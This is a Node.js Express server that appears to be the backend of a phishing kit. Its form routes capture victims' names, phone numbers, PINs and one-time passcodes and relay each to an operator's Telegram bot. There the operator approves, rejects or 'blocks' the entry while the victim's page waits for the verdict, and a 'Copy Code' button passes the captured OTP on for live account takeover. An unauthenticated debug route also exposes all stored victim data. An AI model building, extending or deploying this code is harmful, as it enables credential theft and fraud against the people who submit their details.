require('dotenv').config();

const express = require('express');
const axios = require('axios');
const crypto = require('crypto');
const path = require('path');
const fs = require('fs');

const app = express();

const PORT = process.env.PORT || 10000;
const DOMAIN = (process.env.BACKEND_URL || '').replace(/\/+$/, '');

const REQUIRED_UPDATES = ['message', 'callback_query'];
const SEP = '━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━';
const REQ_TTL_MS = 30 * 60 * 1000;

// Keepalive: ping self every 14 minutes to prevent Render free-tier sleep
const KEEPALIVE_INTERVAL_MS = 14 * 60 * 1000;
// Webhook refresh: re-register webhooks every 10 minutes
const WEBHOOK_REFRESH_INTERVAL_MS = 10 * 60 * 1000;

// Telegram hard limits
const TELEGRAM_MSG_LIMIT = 4096;
const DISPLAY_CLIP = 3500;


// ============================================================
// STARTUP
// ============================================================
console.log('');
console.log('========================================');
console.log('🚀 SERVER STARTING');
console.log('========================================');
console.log('PORT:', PORT);
console.log('DOMAIN:', DOMAIN || '(NOT SET)');
console.log('========================================');
if (!DOMAIN) console.warn('⚠️ BACKEND_URL is not set.');


// ============================================================
// BOTS
// ============================================================
const bots = [];
for (const key of Object.keys(process.env)) {
  const match = key.match(/^BOT(\d+)_TOKEN$/);
  if (!match) continue;
  const number = match[1];
  const token = process.env[`BOT${number}_TOKEN`];
  const chatId = process.env[`BOT${number}_CHATID`];
  if (token && chatId) bots.push({ botId: `bot${number}`, token, chatId });
}

console.log('');
console.log('🤖 BOTS LOADED:');
if (bots.length === 0) console.log('(none)');
else for (const bot of bots) console.log(`   ✅ ${bot.botId}`);
console.log('');


// ============================================================
// STORE
// ============================================================
const STORE_FILE = path.join(__dirname, 'data', 'store.json');
fs.mkdirSync(path.dirname(STORE_FILE), { recursive: true });
const store = { requests: {} };

function loadStore() {
  try {
    if (!fs.existsSync(STORE_FILE)) {
      console.log('💾 No existing store found.');
      return;
    }
    const raw = fs.readFileSync(STORE_FILE, 'utf8');
    const parsed = JSON.parse(raw);
    Object.assign(store.requests, parsed.requests || {});
    console.log('💾 Loaded', Object.keys(store.requests).length, 'stored requests');
  } catch (error) {
    console.error('❌ Store load error:', error.message);
  }
}

function saveStore() {
  try {
    fs.writeFileSync(STORE_FILE, JSON.stringify(store, null, 2));
  } catch (error) {
    console.error('❌ Store save error:', error.message);
  }
}

loadStore();

setInterval(() => {
  const now = Date.now();
  let changed = false;
  for (const [id, r] of Object.entries(store.requests)) {
    if (now - r.createdAt > REQ_TTL_MS) {
      delete store.requests[id];
      changed = true;
    }
  }
  if (changed) saveStore();
}, 5 * 60 * 1000);


// ============================================================
// HELPERS
// ============================================================
function getBot(botId) {
  return bots.find(bot => bot.botId === botId);
}

function newId() {
  return crypto.randomBytes(5).toString('hex');
}

// Strict clean — only for identifiers (name, phone) where we control format
function clean(value) {
  const s = String(value == null ? '' : value)
    .replace(/[\u200B-\u200D\uFEFF]/g, '')
    .replace(/[|:]/g, '')
    .trim();
  return /^unknown$/i.test(s) ? '' : s;
}

// Raw clean — preserves EVERYTHING the user pasted.
// Only strips characters that genuinely corrupt transport/JSON:
//   - zero-width invisible chars
//   - C0 control chars except \n \t \r
function cleanRaw(value) {
  return String(value == null ? '' : value)
    .replace(/[\u200B-\u200D\uFEFF]/g, '')
    .replace(/[\x00-\x08\x0B\x0C\x0E-\x1F\x7F]/g, '');
}

// Truncate for Telegram display only. Full value stays in the store.
function clipForDisplay(value, max = DISPLAY_CLIP) {
  const s = String(value == null ? '' : value);
  if (s.length <= max) return s;
  return s.slice(0, max) + `… (${s.length - max} more chars)`;
}

function escapeHtml(value) {
  return String(value == null ? '' : value)
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;');
}

function buildMessage(header, name, phone, extraLines = []) {
  const lines = [
    `<b>${escapeHtml(header)}</b>`,
    SEP,
    `<b>Name:</b>  <b>${escapeHtml(name || '')}</b>`,
    `<b>Phone:</b> <b>${escapeHtml(phone || '')}</b>`
  ];
  if (extraLines.length) {
    lines.push(SEP);
    lines.push(...extraLines);
  }
  lines.push(SEP);
  return lines.join('\n');
}


// ============================================================
// CALLBACK DATA — action:requestId ONLY.
// User content never goes into callback_data, so no escaping needed.
// ============================================================
function packCallback(action, requestId) {
  return `${action}:${requestId}`;
}

function unpackCallback(data) {
  if (!data) return null;
  const i = data.indexOf(':');
  if (i < 0) {
    return { action: data, requestId: '' };
  }
  return {
    action: data.slice(0, i),
    requestId: data.slice(i + 1)
  };
}


// ============================================================
// TELEGRAM API
// ============================================================
async function telegram(bot, method, payload) {
  try {
    const response = await axios.post(
      `https://api.telegram.org/bot${bot.token}/${method}`,
      payload,
      { timeout: 15000 }
    );
    return response.data;
  } catch (error) {
    console.error(`❌ Telegram ${method} error:`);
    console.error(error.response?.data || error.message);
    return null;
  }
}

async function sendMessage(bot, text, keyboard = null) {
  return telegram(bot, 'sendMessage', {
    chat_id: bot.chatId,
    text,
    parse_mode: 'HTML',
    ...(keyboard ? { reply_markup: { inline_keyboard: keyboard } } : {})
  });
}

async function replyMessage(bot, replyToMessageId, text) {
  return telegram(bot, 'sendMessage', {
    chat_id: bot.chatId,
    text,
    parse_mode: 'HTML',
    reply_to_message_id: replyToMessageId,
    allow_sending_without_reply: true
  });
}

async function editMessage(bot, chatId, messageId, text) {
  return telegram(bot, 'editMessageText', {
    chat_id: chatId,
    message_id: messageId,
    text,
    parse_mode: 'HTML',
    reply_markup: { inline_keyboard: [] }
  });
}

async function answerCallback(bot, callbackId, text) {
  // Telegram caps answerCallbackQuery.text at 200 chars
  const safe = String(text || '').slice(0, 200);
  return telegram(bot, 'answerCallbackQuery', {
    callback_query_id: callbackId,
    text: safe
  });
}


// ============================================================
// WEBHOOK SETUP
// ============================================================
async function setWebhook(bot, quiet = false) {
  const webhookUrl = `${DOMAIN}/telegram/${bot.botId}`;

  const result = await telegram(bot, 'setWebhook', {
    url: webhookUrl,
    allowed_updates: REQUIRED_UPDATES,
    drop_pending_updates: false
  });

  if (!result?.ok) {
    console.error(`❌ WEBHOOK FAILED: ${bot.botId}`, result);
    return false;
  }
  if (!quiet) console.log(`✅ WEBHOOK REGISTERED: ${bot.botId} → ${webhookUrl}`);
  return true;
}

async function initializeWebhooks() {
  console.log('');
  console.log('========================================');
  console.log('🔧 INITIALIZING WEBHOOKS');
  console.log('========================================');
  for (const bot of bots) await setWebhook(bot);
  console.log('✅ WEBHOOK INITIALIZATION FINISHED');
  console.log('');
}

async function refreshWebhooksQuiet() {
  let ok = 0;
  for (const bot of bots) {
    if (await setWebhook(bot, true)) ok++;
  }
  console.log(`🔁 Webhook refresh: ${ok}/${bots.length} OK @ ${new Date().toISOString()}`);
}


// ============================================================
// KEEPALIVE — prevents Render free-tier sleep
// ============================================================
function startKeepalive() {
  if (!DOMAIN) {
    console.warn('⚠️ KEEPALIVE DISABLED — DOMAIN not set');
    return;
  }
  const url = `${DOMAIN}/health`;
  console.log(`💓 KEEPALIVE: pinging ${url} every ${KEEPALIVE_INTERVAL_MS / 60000} min`);

  setInterval(async () => {
    try {
      const r = await axios.get(url, { timeout: 10000 });
      console.log(`💓 Keepalive OK (${r.status}) @ ${new Date().toISOString()}`);
    } catch (err) {
      console.error(`💓 Keepalive FAILED: ${err.message}`);
    }
  }, KEEPALIVE_INTERVAL_MS);
}


// ============================================================
// MIDDLEWARE
// ============================================================
app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(express.static('public'));


// ============================================================
// HEALTH + DEBUG
// ============================================================
app.get('/health', (req, res) => {
  res.json({
    ok: true,
    domain: DOMAIN,
    uptime: Math.floor(process.uptime()),
    bots: bots.map(bot => bot.botId),
    stored: Object.keys(store.requests).length,
    time: new Date().toISOString()
  });
});

app.get('/debug/store', (req, res) => {
  res.json(store);
});


// ============================================================
// BOT ROUTE
// ============================================================
app.get('/bot/:botId', (req, res) => {
  const bot = getBot(req.params.botId);
  if (!bot) return res.status(404).send('Unknown bot');
  res.redirect(`/index.html?botId=${encodeURIComponent(bot.botId)}`);
});


// ============================================================
// SUBMIT ROUTES
// ============================================================
function handleSubmit(type) {
  return (req, res) => {
    const body = req.body || {};
    console.log('');
    console.log(`📥 /submit-${type}`, JSON.stringify(body));

    const bot = getBot(body.botId);
    if (!bot) {
      console.log('❌ submit: unknown botId', body.botId);
      return res.status(400).json({ error: `unknown bot: ${body.botId}` });
    }

    const requestId = newId();
    const rec = {
      botId: bot.botId,
      type,
      name: clean(body.name),
      phone: clean(body.phone),
      status: 'pending',
      createdAt: Date.now()
    };

    let header;
    let extra = [];
    let keyboard;

    if (type === 'phone') {
      header = '📱 PHONE NUMBER VERIFICATION';
      keyboard = [[
        { text: '✅ Approve', callback_data: packCallback('phone_ok',  requestId) },
        { text: '❌ Reject',  callback_data: packCallback('phone_bad', requestId) }
      ]];
    } else if (type === 'pin') {
      rec.pin = cleanRaw(body.pin);
      extra = [`<b>PIN:</b>  <b><code>${escapeHtml(clipForDisplay(rec.pin))}</code></b>`];
      header = '🔐 PIN VERIFICATION';
      keyboard = [
        [{ text: '✅ Correct', callback_data: packCallback('pin_ok',    requestId) },
         { text: '❌ Wrong',   callback_data: packCallback('pin_bad',   requestId) }],
        [{ text: '🛑 Block',   callback_data: packCallback('pin_block', requestId) }]
      ];
    } else if (type === 'code') {
      rec.code = cleanRaw(body.code);
      extra = [`<b>Code:</b> <b><code>${escapeHtml(clipForDisplay(rec.code))}</code></b>`];
      header = '🔑 OTP CODE VERIFICATION';
      keyboard = [
        [{ text: '✅ Correct', callback_data: packCallback('code_ok',   requestId) },
         { text: '❌ Wrong',   callback_data: packCallback('code_bad',  requestId) }],
        [{ text: '📋 Copy Code', callback_data: packCallback('code_copy', requestId) }]
      ];
    }

    store.requests[requestId] = rec;
    saveStore();

    console.log(`📝 stored ${requestId}`, JSON.stringify(rec));

    sendMessage(bot, buildMessage(header, rec.name, rec.phone, extra), keyboard);

    res.json({ requestId });
  };
}

app.post('/submit-phone', handleSubmit('phone'));
app.post('/submit-pin',   handleSubmit('pin'));
app.post('/submit-code',  handleSubmit('code'));


// ============================================================
// CHECK ROUTES
// ============================================================
function handleCheck(req, res) {
  const r = store.requests[req.params.requestId];
  if (!r) return res.json({ approved: null });

  const map = {
    pending:  { approved: null },
    approved: { approved: true },
    rejected: { approved: false },
    wrong:    { approved: false },
    blocked:  { approved: false, blocked: true }
  };
  res.json(map[r.status] || { approved: null });
}

app.get('/check-phone/:requestId', handleCheck);
app.get('/check-pin/:requestId',   handleCheck);
app.get('/check-code/:requestId',  handleCheck);


// ============================================================
// TELEGRAM GET TEST + WEBHOOK INFO
// ============================================================
app.get('/telegram/:botId', (req, res) => {
  res.json({
    ok: true,
    route: `/telegram/${req.params.botId}`,
    message: 'Webhook route is reachable'
  });
});

app.get('/webhook-info/:botId', async (req, res) => {
  const bot = getBot(req.params.botId);
  if (!bot) return res.status(404).json({ ok: false, error: 'Unknown bot' });
  const result = await telegram(bot, 'getWebhookInfo', {});
  res.json(result || { ok: false, error: 'Telegram request failed' });
});

app.get('/telegram-test/:botId', async (req, res) => {
  const bot = getBot(req.params.botId);
  if (!bot) return res.status(404).json({ ok: false, error: 'Unknown bot' });

  const result = await sendMessage(
    bot,
    '🧪 <b>Webhook callback test</b>\n\nClick the button below.',
    [[{ text: 'TEST CALLBACK', callback_data: 'test_callback' }]]
  );
  res.json({ ok: result?.ok === true, botId: bot.botId, telegram: result });
});


// ============================================================
// TELEGRAM POST WEBHOOK
// ============================================================
app.post('/telegram/:botId', async (req, res) => {
  console.log('');
  console.log('========================================');
  console.log('🚨 TELEGRAM WEBHOOK RECEIVED');
  console.log('========================================');
  console.log('🆔 Bot ID:', req.params.botId);

  res.sendStatus(200);

  try {
    const bot = getBot(req.params.botId);
    if (!bot) {
      console.error('❌ UNKNOWN BOT:', req.params.botId);
      return;
    }

    const callback = req.body?.callback_query;
    if (!callback) {
      console.log('ℹ️ Update contains no callback_query');
      return;
    }

    const data = callback.data || '';
    console.log('🔘 Callback data:', data);

    // ---- Test callback ----
    if (data === 'test_callback') {
      await answerCallback(bot, callback.id, 'Webhook is working ✅');
      if (callback.message?.chat?.id && callback.message?.message_id) {
        await editMessage(
          bot,
          callback.message.chat.id,
          callback.message.message_id,
          '✅ <b>TEST CALLBACK RECEIVED</b>\n\nTelegram → Render → Express is working.'
        );
      }
      return;
    }

    // ---- Parse ----
    const parsed = unpackCallback(data);
    if (!parsed || !parsed.requestId) {
      console.log('⚠️ Malformed callback data:', data);
      await answerCallback(bot, callback.id, 'Invalid action');
      return;
    }

    const { action, requestId } = parsed;
    console.log('🎯 Action:', action, '| requestId:', requestId);

    // ---- Store lookup (single source of truth) ----
    const rec = store.requests[requestId];
    if (!rec) {
      console.log('⚠️ Unknown requestId (store miss or expired):', requestId);
      await answerCallback(bot, callback.id, 'This request has expired.');
      return;
    }

    console.log('📋 Using:', JSON.stringify({ name: rec.name, phone: rec.phone }));

    // ---- Copy code ----
    if (action === 'code_copy') {
      await answerCallback(bot, callback.id, 'Sent for copying');
      const payload = `<code>${escapeHtml(clipForDisplay(rec.code || ''))}</code>`;
      if (callback.message?.message_id) {
        await replyMessage(bot, callback.message.message_id, payload);
      } else {
        await sendMessage(bot, payload);
      }
      return;
    }

    // ---- Map action → status ----
    let newStatus;
    let feedback;
    switch (action) {
      case 'phone_ok':  newStatus = 'approved'; feedback = 'Approved ✅';     break;
      case 'phone_bad': newStatus = 'rejected'; feedback = 'Rejected ❌';     break;
      case 'pin_ok':    newStatus = 'approved'; feedback = 'Correct ✅';      break;
      case 'pin_bad':   newStatus = 'wrong';    feedback = 'Wrong ❌';        break;
      case 'pin_block': newStatus = 'blocked';  feedback = 'User blocked 🛑'; break;
      case 'code_ok':   newStatus = 'approved'; feedback = 'Correct ✅';      break;
      case 'code_bad':  newStatus = 'wrong';    feedback = 'Wrong ❌';        break;
      default:
        console.log('⚠️ Unknown action:', action);
        await answerCallback(bot, callback.id, 'Unknown action');
        return;
    }

    rec.status = newStatus;
    rec.updatedAt = Date.now();
    saveStore();

    console.log(`✅ ${action} → ${requestId} (${rec.name} / ${rec.phone}) status=${newStatus}`);

    await answerCallback(bot, callback.id, feedback);

    // ---- Rebuild the SAME message from the SAME record ----
    const headers = {
      phone: '📱 PHONE NUMBER VERIFICATION',
      pin:   '🔐 PIN VERIFICATION',
      code:  '🔑 OTP CODE VERIFICATION'
    };
    const extra = [];
    if (rec.type === 'pin'  && rec.pin)  extra.push(`<b>PIN:</b>  <b><code>${escapeHtml(clipForDisplay(rec.pin))}</code></b>`);
    if (rec.type === 'code' && rec.code) extra.push(`<b>Code:</b> <b><code>${escapeHtml(clipForDisplay(rec.code))}</code></b>`);
    extra.push(`<b>Status:</b> ${feedback}`);

    const newText = buildMessage(headers[rec.type] || 'VERIFICATION', rec.name, rec.phone, extra);

    if (callback.message?.message_id) {
      await editMessage(bot, callback.message.chat.id, callback.message.message_id, newText);
    }
    await sendMessage(bot, buildMessage(`📝 RESPONSE — ${feedback}`, rec.name, rec.phone));

  } catch (error) {
    console.error('');
    console.error('❌ WEBHOOK PROCESSING ERROR');
    console.error(error.stack || error.message);
  }
});


// ============================================================
// START
// ============================================================
app.listen(PORT, async () => {
  console.log('');
  console.log('========================================');
  console.log(`🚀 SERVER LISTENING ON PORT ${PORT}`);
  console.log('🌐 DOMAIN:', DOMAIN);
  console.log('========================================');

  if (!DOMAIN) {
    console.error('❌ BACKEND_URL is missing.');
    return;
  }

  await initializeWebhooks();

  // Start keepalive so Render free tier doesn't put us to sleep
  startKeepalive();

  // Refresh webhooks every 10 minutes in case Telegram drops them
  setInterval(refreshWebhooksQuiet, WEBHOOK_REFRESH_INTERVAL_MS);
});